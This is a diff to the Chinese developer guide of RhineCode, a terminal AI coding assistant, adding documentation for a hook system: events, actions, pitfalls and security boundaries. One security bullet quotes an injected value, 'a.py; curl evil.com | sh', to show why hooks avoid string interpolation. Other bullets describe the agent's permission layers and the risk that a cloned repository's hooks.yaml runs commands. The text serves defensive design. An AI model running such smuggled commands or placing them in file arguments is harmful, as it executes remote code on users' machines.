@@ -15,7 +15,8 @@ RhineCode 是一个用 Python + Textual 实现的终端 AI 编程助手，交互
 | [`internals/capabilities.md`](docs/internals/capabilities.md) | 想知道某个能力的**实际行为与边界**：阈值多少、失败怎么降级、哪些 Provider 生效 |
 | [`internals/testing.md`](docs/internals/testing.md) | 要加/改测试，或想知道某个行为**有没有护栏钉着** |
 | [`internals/config.md`](docs/internals/config.md) | 要动配置加载、新增配置项或模板生成 |
-| [`docs/c11/README.md`](docs/c11/README.md) | 当前章节的 spec/plan/task/checklist 与验收记录导航 |
+| [`docs/c12/README.md`](docs/c12/README.md) | **当前章节**（C12 Hook 系统）的 spec/plan/task/checklist |
+| [`docs/c11/README.md`](docs/c11/README.md) | C11 的四份文档与验收记录导航 |
 | [`docs/extensions/README.md`](docs/extensions/README.md) | **工具/能力扩展**（不占章节号）的文档在哪、以及「该开新章节还是算扩展」怎么判 |
 | [`docs/todo/README.md`](docs/todo/README.md) | **下一步做什么** —— 待选方向，按优先级编号，每份自带可一键复制的开工 Prompt |
 
@@ -23,7 +24,7 @@ RhineCode 是一个用 Python + Textual 实现的终端 AI 编程助手，交互
 学习与解释要求、已知后续工程项。索引解决「我要查点东西」，解决不了
 「我不知道自己需要知道」——所以这几类不能挪进分册。
 
-当前主线到 **C11**，以 DeepSeek Provider 为主。能力自下而上分层，每一层都仍在生效：
+当前主线到 **C12**，以 DeepSeek Provider 为主。能力自下而上分层，每一层都仍在生效：
 
 | 章节 | 能力 | 一句话 |
 | --- | --- | --- |
@@ -34,7 +35,8 @@ RhineCode 是一个用 Python + Textual 实现的终端 AI 编程助手，交互
 | C8 | 上下文管理（两层压缩） | 每次请求前「锚点 + 增量」估算用量；第一层把过大工具结果存盘留占位，第二层调 LLM 把早段压成结构化摘要。幂等、fail-safe、连续失败 3 次熔断，用户原始消息永不改写 |
 | C9 | 记忆系统 | 三层 RHINE.md 项目指令（含 `@include` 展开）+ 每条消息即时 JSONL 存档与容错恢复 + Agent 自然停止后异步沉淀四类笔记；多实例由锁文件防护 |
 | C10 | 斜杠命令系统 | 单一 `CommandSpec` 注册表同时驱动执行 / `/help` / 补全 / 高亮；本地与界面命令绕过 Agent，未知命令不进 AI |
-| C11 | **Skill 系统** | 把重复输入的提示词封装成独立 Markdown 文件（三级存放、两阶段加载、`context: fork` 子对话、`allowed-tools` 预授权、自动注册短命令）。**已对齐 Agent Skills 开放标准**，外部 Skill 目录复制进来即可用。字段与行为细节见下一节 |
+| C11 | Skill 系统 | 把重复输入的提示词封装成独立 Markdown 文件（三级存放、两阶段加载、`context: fork` 子对话、`allowed-tools` 预授权、自动注册短命令）。**已对齐 Agent Skills 开放标准**，外部 Skill 目录复制进来即可用。字段与行为细节见下一节 |
+| C12 | **Hook 系统** | 在生命周期的固定节点上挂用户声明的自动化动作。一条规则 = **事件 + 条件（可省）+ 动作**，从两层 YAML 加载。十二个事件覆盖会话 / 回合 / 消息 / 工具四层加三个系统级；四种动作（shell 命令 / 注入提示词 / HTTP / 子 Agent 占位）；三种执行控制（只跑一次 / 后台异步 / 超时）。**`pre_tool_use` 可拦截，且只能收紧不能放宽**——详见下一节与「安全边界」 |
 
 **已实现的扩展**（不占章节号，文档在 `docs/extensions/`）：
 
@@ -88,6 +90,7 @@ Anthropic / OpenAI Provider 目前保持纯对话能力；工具调用、Plan Mo
 | Permission | `permission/` | 五层防御的纯逻辑引擎 | 第③层规则**必须排在①黑名单②沙箱之后**——这是预授权安全性的全部依据。**②′网络边界层同理必须排在③之前**：晚于③会让一条 `allow: WebFetch(domain:*)` 在③层先行放行，`file://` 与 `127.0.0.1` 整个跳过硬校验。注意理由**不是**「白名单会失效」（那是错的，两种顺序下白名单结论相同）——正因如此，顺序护栏必须用「全域名 allow + 禁止地址」构造，实测「白名单未命中」那种形态在错序下照样通过 |
 | MCP | `mcp/` | 配置、JSON-RPC、两种传输、工具适配、多 Server 编排 | stdio 的 stderr 必须后台 drain，否则 Server 写日志会把子进程写阻塞 |
 | Memory | `memory/` | 锁原语、RHINE.md 加载、会话存档、笔记与索引 | 写盘权收拢在 manager 的锁临界区内——拿锁的人就是写盘的人 |
+| Hooks | `hooks/` | Hook 规则的解析/条件求值/动作执行/分发编排 | 两条：**Hook 只能收紧不能放宽**（`HookDecision` 里没有 ALLOW，`_apply_hook_ask` 只把 ALLOW 升级为 ASK、绝不降级 DENY）——这是本章全部安全论证的依据；**加锁临界区只做纯内存读写**，动作执行、埋点、跨线程调度一律在锁外，违反会让一个 60 秒超时的命令锁死整个 manager，界面假死而调用栈上无线索 |
 | Skills | `skills/` | Skill 解析/发现/渲染/预授权翻译/激活编排（叶子包） | **加锁不变量**：临界区只做纯内存读写，一切回调与跨线程调度在锁外——违反会与 Textual 阻塞式 `call_from_thread` 组成**确定性死锁，整个 TUI 冻结** |
 | Context | `context/` | 两层压缩：估算、工具结果存盘、LLM 摘要 | `allow_summary` 必须在 `and` 链最前面短路——锚点对应主历史，拿它估子对话毫无意义 |
 | Trace | `trace/` | 行为记录器（**跨阶段测试设施**，叶子包只依赖标准库） | 序列化+写入+flush+序号推进必须在**同一临界区**，且**序号只在 flush 成功后推进** |
@@ -105,6 +108,11 @@ Anthropic / OpenAI Provider 目前保持纯对话能力；工具调用、Plan Mo
 都对应一次真实踩过的坑，共同点是**漏改不报错**：编译过、测试绿、界面正常，
 只是某个行为悄悄不对了。动到相关代码前先在这里搜一下关键词。
 
+- **新增 Hook 事件** → `hooks/models.py` 的 `HookEventType`（枚举）+ **同文件的 `EVENT_FIELDS`** + 该事件的负载构造点。**漏改 `EVENT_FIELDS` 不报错**，只是用户在条件里写对了字段名反而被判为非法、整条规则被丢弃——用户只会以为是自己写错了。（三个工具级事件的字段集是**开放**的，见 `OPEN_INPUT_EVENTS`：`tool_input` 的键取决于是哪个工具，加载期不可能枚举，故对它们放行未登记字段名；代价是那三个事件上的字段笔误加载期发现不了，只表现为「这条规则永远不命中」，排查靠 `/hooks` 里的触发次数恒为 0）
+- **新增 Hook 动作类型** → `hooks/models.py`（数据类）+ `hooks/parser.py`（校验分支）+ `hooks/actions.py`（执行器）+ **`hooks/report.py` 的 `describe_action`**。**漏改最后一处不报错**，只是 `/hooks` 与**项目级启动提示**里那条动作显示成「未知动作」——而项目级提示逐条展示命令原文正是 spec F9.1 的**全部安全价值**，显示不出内容等于那道防线没了
+- **新增可 glob 匹配的 Hook 字段** → `hooks/models.py` 的 `FIELD_MATCH_KIND`。**漏改不报错**，只是该字段从「命令/路径语义匹配」悄悄退化成通用通配——词边界丢失后 `git *` 会连 `github-cli` 一起命中，而配置和界面上都看不出异常
+- **新增 `_interact` 的交互种类** → `tui/app.py` 的 `_NOTIFY_KINDS`。两套词汇**刻意不合一**（内部结算标识 vs 写进用户 `hooks.yaml` 的稳定契约，合并会让「改一个内部标识」变成「破坏用户配置」）。漏改不报错，只是那种面板弹出时 `notification` 的 `kind` 退回内部标识，用户按文档写的条件匹配不上
+- **Hook 的 `post_tool_use` / `post_tool_use_failure` 只能挂在 `OUTCOME_EXECUTED` 旁**（`agent/loop.py` 两处）。六种「压根没执行」的分支一个都不能挂——把「没跑」混进「跑了但失败」会让「统计工具失败率」这类用途直接失真，而且不报错。护栏见 `tests/test_hook_intercept.py::NoExecutionBranchesTest`
 - 新增工具 → `tools/registry.py`（注册）+ `permission/adapter.py`（权限映射，按需）+ 若要在 `allowed-tools` 里可写，还要在 `skills/validation.py` 的 `_TOOL_ALIASES` 加一行
 - **改动 Skill 清单表头或 `load_skill` 的工具描述** → `skills/render.py` 的 `_INDEX_HEADER` + `tools/load_skill.py` 的 `description`。**两处必须同口径**（命中就先加载 / 替代默认做法 /用户不必点名 / 拿不准就加载）——它们是模型决定「要不要用 Skill」时读的**唯一两处文本**，一处强一处弱等于白改。⚠️ 那句「替代你自己的默认做法」不可省：少了它，模型会把 Skill 当成「另一种可选做法」而不是「该走的那条路」。两处各有护栏（`test_skill_render.py` / `test_skill_manager.py`）
 - **新增一项 Skill 体检检查** → `skills/models.py` 的 `AdviceKind`（枚举）+ `skills/audit.py`（判定与措辞）。**漏了枚举不报错**，只是那条新检查在测试里没法精确断言，用例只能退回 `assertIn("某个词", report)` 这种脆弱写法——而措辞恰恰是这类建议要反复打磨的东西，改一次碎一批测试，人的第一反应会是把断言放宽成谁都能过
@@ -202,6 +210,7 @@ RHINE_E2E_LIVE=1 python -m unittest tests.test_e2e_live   # 真实模式（缺�
 - `/init`：用内置指令启动一次 Agent Loop，探索项目生成项目根 `RHINE.md`；已存在时不覆盖、只输出改进建议。写盘走完整权限管线（DeepSeek 工具模式生效，c9）。c10 双内容：界面与恢复回放显示 `/init`，模型历史与存档保留展开后的完整提示词（`Message.display_content`）。
 - `/skills`：管理 Skill（c11）。五种形态——无参列出全部 Skill 及其来源层级、在哪执行（主对话 / 子对话）、激活状态、加载错误、字段提示，**以及体检建议段**（作者期扩展：七项检查，每条都给出具体改法；无建议时整段不出现；有建议时段尾指向 `/skill-creator`）；`/skills prompt` 查看当前**实际注入**了什么（第一阶段清单 / 已激活正文 / 当前可见工具集），排查「为什么模型没按我的 Skill 做」用；`/skills reload` 热更新定义（已激活的正文自动换新，定义消失的自动卸载，**斜杠短命令一并重新注册**——新增的立刻可补全可执行、删除的随之消失，`allowed-tools` 里认不出的项只丢弃并警告，既不终止进程也不影响下次启动——外部 Skill 里出现 `Task` / `TodoWrite` 这类名字是正常现象。**注意 `WebFetch` 现在是真工具**，写它不再产生「无对应工具类别」警告，但括号里必须写成 `WebFetch(domain:...)`，漏掉前缀会被丢弃并单独警告）；`/skills off [名字]` 卸载指定或全部激活项；`/skills run <名字> [参数]` 执行指定 Skill（通用入口，也是短命令被重名跳过时的替代入口）。
 - **Skill 短命令**：每个 Skill 自动注册 `/<name>`（如 `/commit`、`/review`），进 Tab 补全与 `/help`；与内置命令或其别名重名时跳过注册并在启动时提示改用 `/skills run <name>`。
+- `/hooks`：查看已加载的 Hook 规则（来源层、事件、条件、动作、本次运行的触发次数与最近结论）、加载警告与配置位置。纯只读，**本章不做 `reload`**，改了规则要重启（c12）。
 - `/clear`（别名 `/reset`、`/new`）：清空当前对话历史（并复位上下文压缩的锚点/熔断/已存盘状态；会话存档开新档、旧档保留，c9；一并卸载全部已激活 Skill，c11）。
 - `/exit`（别名 `/quit`）：退出程序。
 
@@ -224,9 +233,13 @@ RHINE_E2E_LIVE=1 python -m unittest tests.test_e2e_live   # 真实模式（缺�
 
 ## Spec 驱动开发
 
-开发新功能/章节前使用 `/spec` 技能，协作澄清需求后依次生成 `spec.md → plan.md → task.md → checklist.md`，再据此开发与验收。当前主线章节为 `docs/c11/`。
+开发新功能/章节前使用 `/spec` 技能，协作澄清需求后依次生成 `spec.md → plan.md → task.md → checklist.md`，再据此开发与验收。当前主线章节为 `docs/c12/`。
 
 **四份文档放哪，取决于这次做的是「章节」还是「扩展」**：引入新能力层级、架构表要多一层的进 `docs/<章节>/`；在既有层上加工具/加规则/扩边界的进 `docs/extensions/<扩展名>/`，**不占章节号**。判据只有一条：`CLAUDE.md` 的能力表要不要多一行——要就是章节，不要就是扩展。详见 [`docs/extensions/README.md`](docs/extensions/README.md)。
+
+**C12（Hook 系统）的四份文档在 `docs/c12/`**，进门先读 `docs/c12/README.md`。
+⚠️ `spec.md` 的 F2 边界第 2 条带一个**勘误块**（实现期发现该条与 F6 的管线位置自相矛盾），
+读那一条时必须连勘误一起读。
 
 C11 的全部文档收在 `docs/c11/` 一个目录下，进门先读 **`docs/c11/README.md`**（导航 + 「冲突时以谁为准」）。目录分三块：
 
@@ -240,7 +253,7 @@ C10（斜杠命令系统）、C9（记忆系统）、C8（上下文管理）、C
 
 ```bash
 python -m compileall rhinecode tests
-python -m unittest discover -s tests      # 1266 项，skipped 4
+python -m unittest discover -s tests      # 1459 项，skipped 4
 ```
 
 默认跳过 4 项：真实模型端到端（需 `RHINE_E2E_LIVE=1` 与有效凭据）与「连续起停」
@@ -273,6 +286,12 @@ python -m unittest discover -s tests      # 1266 项，skipped 4
 - Skill 系统（c11）三条：① **信任模型**——Skill 正文是「发给模型的文本」，可以指挥模型读写文件、执行命令。项目级 Skill 随代码仓库分发，`git pull` 后可能凭空多出几个，因此每次启动都提示「发现 N 个项目级 Skill」且**刻意不做「只提示一次」的持久化**（有状态的话新增时状态不失效，新来的就被静默吞掉）；评审 `.rhinecode/skills/` 应与评审代码同等对待。② **无权限豁免**——Skill 拿不到任何权限捷径，它指挥的每个工具调用照样过五层管线，正文里写「直接执行 rm -rf /」也只会在第①层黑名单被拦下。③ **`allowed-tools` 是预授权，不是安全边界**——它只**放宽**（列出的操作在本次执行内免于人工确认），从不收紧，且**翻不过前两层**：声明「放行全部命令」的 Skill 照样在第①层黑名单被拦，声明「放行全部写入」照样在第②层沙箱被拦，配置里的 deny 也压得过它（同层内 deny 优先）。要**限制**模型能做什么，唯一手段是 `permissions.yaml` 的 deny 规则。授权跟「触发」走不跟「激活态」走，用户发出下一条消息即失效。另：用户级 `~/.rhinecode/skills/` 与内置目录经 path_guard **只读白名单**放行（目录型 Skill 的随附资源在工作区外，模型需按清单读取），与 c9 的 memory 目录同理——只对 read 类判定生效，write/glob/grep 面完全不动。
 
   **作者期扩展补两条**：④ **体检只观测、不改判定**——它不影响任何 Skill 的加载结果，也不影响权限管线的任何一层，且**不读任何文件内容**（纯函数零 IO，输入只有已解析的定义）。⑤ **`skill-creator` 无任何写盘旁路**——它指挥的创建与修改一律走 `write_file` / `edit_file` 完整管线，用户在确认面板上看到内容后才落盘；它的 `allowed-tools` **只预授权只读调研**，写入与编辑刻意不给。另：**本版本只能创建项目级 Skill**——用户级与内置目录都在工作区外，写类判定被第②层沙箱一律拒绝（只读白名单**不覆盖写类**），而预授权翻不过第②层。这是结构性限制，`skill-creator` 被要求装到用户级时须如实说明做不到、给出手工做法，**不要尝试写入**（试了只会拿一个「路径越界」去困惑用户）。
+- **Hook 系统（c12）五条**：
+  ① **Hook 只能收紧，不能放宽**。`pre_tool_use` 的结论只有拦截（deny）/ 升级为人工确认（ask）/ 不表态三种，**没有 allow**；`ask` 也只把权限管线的 ALLOW 升级为 ASK，**绝不把 DENY 降级**。因此 Hook 加进来之后「能通过的调用集合」只会变小，C6 的五层顺序不变量、预授权安全性论证、Skill `allowed-tools` 的「只放宽从不收紧」承诺，全部原样成立。一个照着 Claude Code 文档写出来的 Hook 会输出 `{"decision":"allow"}`，真正拦住它的是 `actions.parse_decision` 里那个白名单分支（有反证测试钉着）。
+  ② **项目级 `hooks.yaml` 是本章最大的攻击面**。它随代码仓库分发，而 Hook 的动作**直接执行**、不经模型、不经人在回路确认——`git clone` 一个仓库再启动 rhine，对方写在 `session_start` 上的命令就在你机器上跑起来了。这比项目级 Skill 严重一个量级（Skill 正文只是「发给模型的文本」，它指挥的每个工具调用照样过五层管线）。对冲手段只有一个：启动时**逐条列出**每条项目级规则的「事件 → 动作原文」，命令串与 URL 完整不截断，且**每次启动都提示**（刻意不做持久化——有状态的话 `git pull` 新拉进来的规则会被静默吞掉）。**评审 `.rhinecode/hooks.yaml` 应与评审代码同等对待。**
+  ③ **Hook 命令过①危险命令黑名单，不过②③④⑤**。①层的既有性质是「不可被任何配置或权限模式放开」，而 `hooks.yaml` 就是配置。其余四层不过：Hook 是用户配置而非模型行为，过完整管线等于每次自动化都弹确认，自动化即失去意义。
+  ④ **配置里不做任何字符串插值**。上下文只经**标准输入的 JSON** 抵达命令，因此模型生成的工具参数不可能被拼进 shell 命令行。做插值的话，一个 `file_path = "a.py; curl evil.com | sh"` 就能让分号后半截跑在用户机器上，而**那不经五层权限管线**（它不是工具调用，是 Hook 自己执行的命令）。
+  ⑤ **`http` 动作是本项目第二条主动外发链路**，且比 `web_fetch` 危险——后者「只取不发」（无请求体、无自定义头），前者明确要发 body 与 header。它过②′网络边界层的**结构性硬校验**（禁 `file://`、禁内嵌凭据、禁回环与非公网地址，复用 `permission/network.py` 的同一份实现），但**不要求域名白名单**（`hooks.yaml` 是配置不是模型输出，要求白名单会让「配了 hook 却发不出去」成为常态）。另：Hook 的事件负载含完整工具参数与工具输出，**与 trace 产物同级敏感**——模型读过的配置文件内容会原样进入 `pre_tool_use` 的负载、进而进入 hook 的 stdin 与 `hook_execute` 记录，`http` 动作更会把它发到外部。
 - 行为记录（trace，测试设施）：**产物比会话存档更敏感**——里面既有完整的模型请求与响应，也有每次工具执行的参数与**输出原文**（被读过的文件内容、命令输出）。如果模型在对话中读过配置文件，那份内容会原样进入 `tool_execute` 事件，**其中可能含明文 API Key**。三条纪律：① 忽略规则要加在**启动 `rhine` 的那个项目**里——trace 产物落在该项目根的 `.rhinecode/traces/` 下，而本仓库 `.gitignore` 的那行只在开发 RhineCode 时生效；去别的项目跑 trace 前，先给那个项目的 `.gitignore` 补上 `.rhinecode/traces/`（**实测过：不补就会被 `git status` 列出来**）。勿提交、勿外传、勿贴进 issue；② `session_start` 的配置快照里 `api_key` 已被固定掩码替换（`redact_config` 是白名单式逐字段取值，新增含密字段默认不记录），但这**只保证配置快照**——工具输出里的泄漏不在它的职责范围内，由 `.gitignore` 兜底；③ 记录器**不改变任何权限判定**，它只观测；`--trace` 不是权限开关，开启它不会让模型多做任何一件事。另：记录失败一律静默（写盘失败、路径不可写、负载序列化异常全被吞掉），这是**有意的**——观测设施绝不能反过来阻断被观测的系统。
 - 端到端驱动设施（P1a，测试设施）四条：① **控制通道不鉴权**——它只绑 `127.0.0.1`、只在宿主活着的这段时间存在，任何能在本机跑程序的人都能连上去驱动它。这是刻意接受的取舍（加鉴权会让一个测试设施凭空多出密钥管理），代价是**驱动期间应把本机视为可信环境**；真实模式尤其要注意，那时宿主进程持有你的真实凭据。② **驱动器不扩大权限面**——它替人应答只是换了第⑤层人在回路的执行者，前四层一字不动：驱动者选「放行」的危险命令照样在第①层黑名单被拦下（`test_e2e_host.py` 有专门护栏钉着这条）。③ **`exclude_tools` 摘掉的两个工具是隔离边界的一部分**：`mcp_add_server` 会写**真实**用户主目录且不吃 `user_dir`，`mcp_resolve_server` 虽是 `read_only=True` 却要访问外部包索引——而只读且被放行的工具**根本不弹面板**，应答者拦不住它。改动这个集合前先想清楚隔离还成不成立。④ **宿主的记录产物与 trace 同等敏感**（它就是 trace），落在临时工作区里、随宿主退出一并删除；用 `--keep-workspace` 保留时请自行按上一条的三条纪律处理。
 - **网络访问（web_fetch 扩展）**：这是 RhineCode 第一个**能主动向外发送数据**的工具，三条要点——
@@ -307,9 +326,11 @@ python -m unittest discover -s tests      # 1266 项，skipped 4
 10. Trace 记录器后续项（spec 明确不做）：TUI 驱动器（P1，用 Pilot 无人驱动界面跑完整场景，本轮只做 P0 记录器）、记录文件的自动清理与轮转（`--trace` 每次运行产一个新文件，攒多了要手工删）、实时流式查看（当前只能事后读文件）、可视化时间线、跨运行对比与差异分析、阈值（字段截断 4000 字符 / 消息条数 400）可配置化、采样与按类型开关（当前只有「全开」与「全关」两态）。
 11. 记忆系统后续项（C9 spec 明确不做）：向量数据库/RAG 语义检索（召回只靠索引注入 + 按路径读文件）、团队记忆同步/跨机器共享、跨实例实时一致性（锁只保证「写不坏」，语义重复笔记靠 LLM 去重收敛）、笔记自动清理与遗忘机制、各阈值（24h 提醒/30 天过期/索引 200 行/锁 600 秒等）可配置化、存档格式版本迁移工具、存档加密或压缩存储。
 
-12. **`SkillReloadOutcome.dropped_fatal` 是死代码**（对齐改造的残留，2026-07-29 登记，已确认**暂不处理**）：该字段现在恒为空元组——`skills/manager.py` 的 reload 硬编码传 `()`，因为「白名单含不存在的内置工具名就丢弃」这套语义已随收窄能力一起删除。连带 `conversation.py` 里 `if outcome.dropped_fatal:` 那个分支**永远进不去**。字段暂留只是为了不动 `trace/reader.py` 的 `skill_reload` 事件摘要契约。清理时要一起动的四处：`skills/models.py`（字段）+ `skills/manager.py`（传值）+ `conversation.py`（消费分支）+ `trace/reader.py`（摘要函数），并检查 `tests/test_trace_reader.py` 是否逐字断言了那段摘要。
+12. **Hook 系统后续项（C12 spec 明确不做）**：子 Agent 动作的真实运行（现为占位，等 SubAgent 章节对接）、`once` 标记的持久化、Hook 执行顺序的显式优先级、迭代级事件（Agent Loop 内单轮迭代不开放挂载点——那是引擎内部结构，暴露成配置契约会让循环结构的任何调整都成为破坏性变更）、配置中的字符串插值、HTTP 动作参与拦截决策、`/hooks reload` 热更新、本地级 `hooks.yaml`、Skill/MCP 形态的 Hook 动作、在 Skill frontmatter 里声明 Hook、Hook 修改工具参数或工具结果（Claude Code 的 `updatedInput` / `updatedToolOutput`）。
 
-13. **粘贴 `/skills` 报告会被命令解析器吞掉**（作者期扩展真实模型验收中观测到，2026-07-30 登记）：`skill-creator` 的「按建议修复」流程会让用户把 `/skills` 的建议段贴回对话里，而报告若以 `/skills` 开头，命令层会把整条消息当成 `/skills <子命令>` 处理并回「未知子命令」，消息**根本不进 AI**。命令系统的行为是对的（c10 的「未知命令不进 AI」是刻意设计），但这条工作流因此有真实摩擦。可选方向：让 `skill-creator` 改成引导用户「用 `/skills prompt` 或直接描述问题」而不是原样粘贴；或在命令层对「首行像命令但后续多行」的输入给一句更贴切的提示。**本次不改**——它牵动 c10 的解析契约，值得单独立项。
+13. **`SkillReloadOutcome.dropped_fatal` 是死代码**（对齐改造的残留，2026-07-29 登记，已确认**暂不处理**）：该字段现在恒为空元组——`skills/manager.py` 的 reload 硬编码传 `()`，因为「白名单含不存在的内置工具名就丢弃」这套语义已随收窄能力一起删除。连带 `conversation.py` 里 `if outcome.dropped_fatal:` 那个分支**永远进不去**。字段暂留只是为了不动 `trace/reader.py` 的 `skill_reload` 事件摘要契约。清理时要一起动的四处：`skills/models.py`（字段）+ `skills/manager.py`（传值）+ `conversation.py`（消费分支）+ `trace/reader.py`（摘要函数），并检查 `tests/test_trace_reader.py` 是否逐字断言了那段摘要。
+
+14. **粘贴 `/skills` 报告会被命令解析器吞掉**（作者期扩展真实模型验收中观测到，2026-07-30 登记）：`skill-creator` 的「按建议修复」流程会让用户把 `/skills` 的建议段贴回对话里，而报告若以 `/skills` 开头，命令层会把整条消息当成 `/skills <子命令>` 处理并回「未知子命令」，消息**根本不进 AI**。命令系统的行为是对的（c10 的「未知命令不进 AI」是刻意设计），但这条工作流因此有真实摩擦。可选方向：让 `skill-creator` 改成引导用户「用 `/skills prompt` 或直接描述问题」而不是原样粘贴；或在命令层对「首行像命令但后续多行」的输入给一句更贴切的提示。**本次不改**——它牵动 c10 的解析契约，值得单独立项。
 
 ## 代码注释规范
 
